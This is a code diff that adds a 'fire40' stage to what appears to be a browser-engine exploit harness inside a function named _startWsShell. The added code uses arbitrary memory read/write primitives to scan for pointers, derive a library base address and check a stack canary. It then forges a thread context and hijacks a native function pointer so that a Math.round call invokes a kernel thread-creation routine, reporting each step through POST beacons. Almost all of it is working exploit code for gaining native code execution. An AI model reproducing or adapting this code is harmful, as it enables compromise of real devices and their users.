@@ -8332,6 +8332,94 @@ function _startWsShell(){
         break;
       }
 
+      case 'fire40':{
+        /* THE ONE-SHOT TID WITNESS (229m option d): fire thr_create with
+         * the 80d gates and RACE-READ [cfr] IMMEDIATELY after the call.
+         * The kernel writes the tid to *RSI = *cfr BEFORE the syscall
+         * returns. If our ctx passes the 14.10 kernel gates, the tid
+         * (a small positive integer) lands at [cfr] and we can read it
+         * before the trampoline's post-call crashes the engine.
+         * VERDICTS:
+         *   [cfr] = small positive int = *** THE SPAWN PROVEN ***
+         *     (the kernel reached thread allocation and accepted our ctx)
+         *   [cfr] unchanged + parent alive = the call DECLINED
+         *     (the ctx failed a gate - read the errno semantics)
+         *   death + no readback = the post-call won the race
+         *     (bisect with the fire31 badmagic/zero-ctx controls) */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function F40(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('F40-'+s),false);x.send();}catch(e){}}
+        try{
+          /* the lk derivation (proven chain) */
+          var ent40=S.absRead(0x10001c8000n,0x100),tr40=0n;
+          for(var e40=0;e40<ent40.length;e40++){if(ent40[e40]>=0x10001f0000n&&ent40[e40]<0x1000200000n){tr40=ent40[e40];break;}}
+          if(tr40===0n){reply.err='no thread-record ptr';break;}
+          var trr40=S.absRead(tr40,0x60),pt40=0n;
+          for(var t40=0;t40<trr40.length;t40++){if(trr40[t40]>=0x880000000n&&trr40[t40]<0x900000000n){pt40=trr40[t40];break;}}
+          if(pt40===0n){reply.err='no pthread ptr';break;}
+          var nd40=pt40,q40=0n;
+          for(var h40=0;h40<5;h40++){
+            var pp40=S.absRead(nd40,0x60);q40=pp40[8];
+            if((q40&0x3fffn)===0x218n&&q40>0x800000000n)break;
+            nd40=q40-0x38n;
+          }
+          if((q40&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var lk40=q40-0x6C218n;
+          var can40=S.absRead(lk40+0x751D0n,8)[0];
+          if(!(can40>0x1000000n)){reply.err='canary fail';break;}
+          F40('1 lk=0x'+lk40.toString(16)+' canary ok');
+          reply.lk='0x'+lk40.toString(16);
+          var THR_CREATE40=lk40+0x13D20n;
+
+          /* the 80d ctx at the scope: RIP=thr_exit stub (the child
+           * exits immediately - the simplest possible child that
+           * proves the ctx passed the gates without any side effects) */
+          for(var z40=0;z40<4;z40++)S.absWrite(S.fakeScope+BigInt(z40*8),0n);
+          S.absWrite(S.fakeScope+0x048n,0n);            /* child RDI=0 (thr_exit arg) */
+          S.absWrite(S.fakeScope+0x0C0n,0x43n);         /* CS */
+          S.absWrite(S.fakeScope+0x0D0n,0n);           /* flags=0 */
+          S.absWrite(S.fakeScope+0x0E0n,lk40+0x13EC0n); /* child RIP=thr_exit */
+          S.absWrite(S.fakeScope+0x0F8n,S.fakeScope+0x800n); /* RSP=cage */
+          S.absWrite(S.fakeScope+0x100n,0x3Bn);         /* SS */
+          S.absWrite(S.fakeScope+0x108n,0x480n);       /* magic */
+          S.absWrite(S.fakeScope+0x110n,0x10000n);     /* type */
+          S.absWrite(S.fakeScope+0x118n,0x20000n);     /* subtype */
+          var cfr40=S.cfr;
+          var cfrSave40=S.absRead(cfr40,8)[0];
+          F40('2 ctx armed RIP=thr_exit gates on cfr=0x'+cfr40.toString(16)+' save=0x'+cfrSave40.toString(16));
+
+          /* pre-call window snapshot: [cfr-0x100, cfr+0x40) */
+          var win40=S.absRead(cfr40-0x100n,0x140);
+          F40('3 pre-window banked');
+
+          /* THE FIRE: swap scope, redirect, call, restore, RACE-READ */
+          F40('CALL thr_create');
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var orig40=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,THR_CREATE40);
+          try{Math.round(-5.7);}catch(e40b){}
+          S.absWrite(S.neEntry.addr+0x28n,orig40);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+
+          /* THE RACE READ: if we get here, the parent survived.
+           * Read [cfr] IMMEDIATELY - before anything else touches it. */
+          var cfrNow40=S.absRead(cfr40,8)[0];
+          F40('4 RACE READ cfrNow=0x'+cfrNow40.toString(16)+' was=0x'+cfrSave40.toString(16));
+          reply.cfr={was:'0x'+cfrSave40.toString(16),now:'0x'+cfrNow40.toString(16)};
+          reply.tidLanded=(cfrNow40!==cfrSave40&&cfrNow40>0n&&cfrNow40<0x1000000n);
+          reply.spawned=reply.tidLanded;
+
+          /* the window diff: any changed slot in [cfr-0x100, cfr+0x40) */
+          var post40=S.absRead(cfr40-0x100n,0x140);
+          var diffs40=[];
+          for(var d40=0;d40<win40.length;d40++){
+            if(win40[d40]!==post40[d40])diffs40.push({at:'0x'+(cfr40-0x100n+BigInt(d40*8)).toString(16),was:'0x'+win40[d40].toString(16),now:'0x'+post40[d40].toString(16)});
+          }
+          reply.windowDiffs=diffs40.slice(0,10);
+          reply.note='tid at [cfr] = spawn proven; unchanged = declined; death = the post-call won the race';
+        }catch(eF40){reply.err='fire40 fault: '+String(eF40&&eF40.message?eF40.message:'?');}
+        break;
+      }
+
       case 'fire31':{
         /* THE MINIMAL SPAWN PROOF (fire-5): the simplest discriminating
          * thr_create fire. Child ctx: RIP=thr_exit(lk+0x13EC0) - the
